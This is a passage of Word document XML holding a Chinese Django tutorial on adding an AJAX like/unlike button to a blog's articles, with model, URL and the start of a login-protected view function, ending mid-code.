            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django实战专题: 开发专业博客(3)之仿微信评论点赞功能</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5905B3C7" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django实战专题: 开发专业博客(3)之仿微信评论点赞功能</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ACEBF0C" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 大江狗 </w:t>
      </w:r>
      <w:hyperlink r:id="rId329" w:history="1">
        <w:r w:rsidRPr="003802BB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-10-18</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7883FC75" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>来自专辑</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A79112E"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Django实战</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11951B82" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在我们前两遍文章里，我们已经创建一个比较完善的Article模型，利用Django的通用视图开发了博客的管理后台，实现了文章的增删查改。我们还配置了CKEditor实现博客文章的富文本编辑(包括上传图片和显示代码)。在本文中我们将对该博客做进一步改进，利用AJAX技术实现仿微信评论的点赞功能。当登录用户点击大拇指按钮时，文章总点赞次数在页面无需刷新的情况下自动加1，当用户再次点击大拇指时，取消点赞，总点赞次数自动减1。非登录用户在点击大拇指按钮时，会被要求先登录。本文参考了部分Django By Example的内容。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="204CFF34" w14:textId="092CB16A" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44E7317A" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果你还没有阅读过本专题，请务必先阅读之前两篇文章:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7461E903" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="00D96E02" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId330" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="003802BB" w:rsidRPr="003802BB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Django实战专题: 开发专业博客(1)之内容管理后台开发</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6B35142B" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="00D96E02" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId331" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="003802BB" w:rsidRPr="003802BB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Django实战专题: 开发专业博客(2)之母子类别导航和添加富文本编辑器CKEditor</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6E53AE07" w14:textId="738819F3" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18BEEE8D" w14:textId="2D5A50B9" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>实现思路</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D9FF1DC" w14:textId="289289D8" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C0E5565" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们在Article模型里增加一个users_like的字段，记录点赞的用户，其与User是多对多的关系(如下所示)。有了这个字段，我们可以使用article.users_like.all查询点赞某篇文章的所有用户，还可以使用article.users_like.count来统计某篇文章的总点赞数。通过使用user.articles_liked.all可以查询某个用户所喜欢的所有文章条目。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CEEE0AE" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># models.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="718E4670" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Article(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC62994" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    """</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>文章模型</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09A6604C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0FCA0C83" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    slug = models.SlugField('slug', max_length=60, blank=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="464AB217" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    body = RichTextUploadingField('</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>正文</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5D6D93" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    pub_date = models.DateTimeField('</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>发布时间</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>', null=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="756DBB0E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    .....</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66618925" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    users_like = models.ManyToManyField(User, </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="432E36A6" w14:textId="0DADFA21" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">               related_name='articles_liked', blank=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EF34410" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3586F7C6" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当用户在前端页面点击大拇指按钮时，我们希望其触发一个AJAX请求到后台。这个AJAX请求发送的数据应包括文章id和动作(like和unlike)。因为request是全局变量，所以即使Ajax发送的数据里即使不包括用户，我们也可以知道request.user是谁。有了文章id，用户和动作，我们就可以轻易的处理请求，并返回Json格式的状态了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15DC383B" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C65E5FB" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们现在需要在urls.py里新增一个名为article_like的url, 专门处理Ajax请求。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C34B104" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#urls.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B40D281" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import path, re_path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B9E42EF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from . import views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="385C8752" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7526268C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># namespace</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02014D40" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>app_name = 'blog'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AA0C4D3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>urlpatterns = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AE7BDB6"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re_path(r'^article/like/$',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1074BA65" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            views.article_like, name='article_like'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="762DFCCE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C77B054" w14:textId="691F708F" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B48A78" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>上述url对应的视图函数如下所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2730CC20" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># views.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DFFF33A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.decorators.http import require_http_methods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="132CA83A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.decorators import login_required</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00A57CB2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00A4EF14" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@login_required</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A27A81C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@require_http_methods(["POST"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A4010F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def article_like(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CDA25E9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    article_id = request.POST.get('id')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F01EC0E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    action = request.POST.get('action')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66081E0B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    if article_id and action:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15461818" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
